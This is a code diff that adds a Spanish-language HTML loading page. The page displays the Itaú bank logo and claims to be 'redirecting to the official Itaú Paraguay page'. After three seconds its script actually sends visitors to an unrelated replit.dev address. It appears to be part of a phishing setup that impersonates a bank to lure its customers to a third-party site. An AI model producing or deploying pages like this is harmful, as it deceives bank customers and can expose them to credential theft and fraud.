@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Pantalla de carga</title>
+
+  <!-- Google Fonts: Poppins -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
+
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background-color: 
+      #ff6201;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      font-family: 'Poppins', sans-serif;
+      color: white;
+      user-select: none;
+    }
+
+    .loader-container {
+      text-align: center;
+    }
+
+    .loader-gif {
+      width: 120px;
+      height: auto;
+      margin-bottom: 5px;
+    }
+
+    .loader-text {
+      font-size: 20px;
+      font-weight: 600;
+      opacity: 0;
+      transform: scale(0.95);
+      animation: fadeZoomIn 1s ease forwards;
+    }
+
+    @keyframes fadeZoomIn {
+      to {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="loader-container">
+    <img src="https://img.lalr.co/cms/2024/03/21072640/Itau-1.jpg" alt="Cargando..." class="loader-gif" />
+    <div class="loader-text">
+      Redirigiendo a la pagina oficial Itaú Paraguay
+    </div>
+  </div>
+
+  <script>
+    setTimeout(() => {
+      window.location.href = 'https://ffa3a532-42a3-47df-9cb3-d35e073329cb-00-6384575fj8hi.picard.replit.dev/';
+    },3000);
+  </script>
+</body>
+</html>
